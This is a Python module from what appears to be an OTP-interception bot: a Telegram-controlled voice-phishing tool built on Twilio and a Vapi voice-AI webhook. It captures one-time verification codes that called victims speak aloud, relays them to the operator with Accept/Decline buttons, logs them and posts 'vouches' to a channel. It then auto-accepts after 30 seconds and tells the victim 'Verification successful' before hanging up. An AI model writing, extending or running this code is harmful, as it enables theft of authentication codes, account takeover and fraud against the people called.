import logging
import threading
from typing import Optional

from telebot import types

logger = logging.getLogger(__name__)

_bot_instance = None


def init_bot(bot):
    global _bot_instance
    _bot_instance = bot


def notify_otp_captured(
    chat_id: int,
    call_sid: str,
    digits: str,
    user_id: str = "unknown",
):
    """Send OTP captured notification to the Telegram user with Accept/Decline buttons.

    This is invoked by the Vapi webhook handler when a transcript contains
    a verification code spoken by the customer. It reuses the existing
    OTP approval workflow — the same Accept/Decline callback handlers
    in bot.py process the user's decision unchanged.
    """
    from bot import send_call_stage_status, store_otp_timer, get_call_session, register_call_session, get_twilio_client, get_call_voice_info, post_vouch_to_channel, log_otp

    session = get_call_session(call_sid)
    if session is None:
        session = register_call_session(call_sid)
    if session is not None:
        session["otp"] = digits
        session["otp_status"] = "pending"
        session["otp_attempts"] = 0

    if chat_id and digits:
        send_call_stage_status(chat_id, "CAPTURE_OTP", f"🔐 Code received: {digits}")
        buttons = types.InlineKeyboardMarkup()
        buttons.add(
            types.InlineKeyboardButton("✅ ACCEPT", callback_data=f"otp_accept_{call_sid}_{digits}"),
            types.InlineKeyboardButton("❌ DECLINE", callback_data=f"otp_decline_{call_sid}_{digits}"),
        )
        try:
            _bot_instance.send_message(
                chat_id,
                "🔐 *OTP Captured*\n\n"
                f"Code: `{digits}`\n\n"
                "Press ✅ to accept and complete the call, or ❌ to decline and retry. "
                "If no action is taken within 30 seconds, the code will be auto-accepted and the call will end.",
                reply_markup=buttons,
                parse_mode="Markdown",
            )
        except Exception as e:
            logger.debug(f"Failed to send OTP message: {e}")

    log_otp(call_sid, digits, status="captured")

    def _auto_accept():
        if not call_sid:
            return
        from bot import get_call_session, VoiceResponse, get_twilio_client
        session_local = get_call_session(call_sid)
        if not session_local or session_local.get("otp_status") != "pending":
            return
        try:
            session_local["otp_status"] = "auto_accepted"
            if digits:
                def _post_vouch():
                    post_vouch_to_channel(call_sid, session_local.get("user_id") or user_id, digits, override_mode="Auto Accept")
                threading.Thread(target=_post_vouch, daemon=True).start()
            from twilio.twiml.voice_response import VoiceResponse
            resp = VoiceResponse()
            resp.say("Verification successful. Thank you. Goodbye.")
            resp.hangup()
            client = get_twilio_client()
            if client:
                client.calls(call_sid).update(twiml=str(resp))
            if chat_id:
                _bot_instance.send_message(chat_id, "⏳ Auto-accepted after timeout. Call ended successfully.")
        except Exception as e:
            logger.exception(f"Auto-accept failed for CallSid={call_sid}: {e}")

    timer = threading.Timer(30.0, _auto_accept)
    timer.daemon = True
    store_otp_timer(call_sid, timer)
    timer.start()
